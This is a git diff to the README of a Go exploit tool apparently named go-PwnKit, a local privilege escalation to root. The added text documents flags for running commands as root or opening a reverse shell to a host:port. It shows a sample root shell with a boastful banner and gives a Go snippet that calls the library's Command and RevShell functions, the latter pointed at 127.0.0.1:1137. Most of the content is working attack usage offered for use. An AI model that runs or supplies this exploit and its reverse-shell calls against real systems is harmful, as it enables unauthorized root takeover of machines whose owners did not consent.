@@ -22,7 +22,10 @@ The ***Makefile*** uses `sed` to temporarily change the package name of the ***p
 
 ## Usage
 
+#### As standalone executable
+
 ```
+$> ./exploit -h
 Usage of ./exploit:
   -c string
         Command to execute as root (default "/bin/sh")
@@ -31,7 +34,34 @@ Usage of ./exploit:
         Optionally open a reverse-shell instead. Format: host:port
 ```
 
-The exploit can either be used with a command (flag `-c`) or as a reverse-shell (flag `-r`).
+The exploit can either be used with a command (`-c`) or as a reverse-shell (`-r`).
+
+
+
+```
+$> ./exploit -g   
+uid=0(root) gid=0(root) groups=0(root),994(input),1000(sudo),1001(oxdbxkxo)
+hax0r in the system!
+sh-5.1#
+```
+
+
+
+#### As package
+
+```go
+package main
+
+import (
+	"github.com/OXDBXKXO/go-PwnKit"
+)
+
+func main() {
+	gopwnkit.Command("id")
+    gopwnkit.RevShell("127.0.0.1:1137")
+}
+
+```
 
 
 
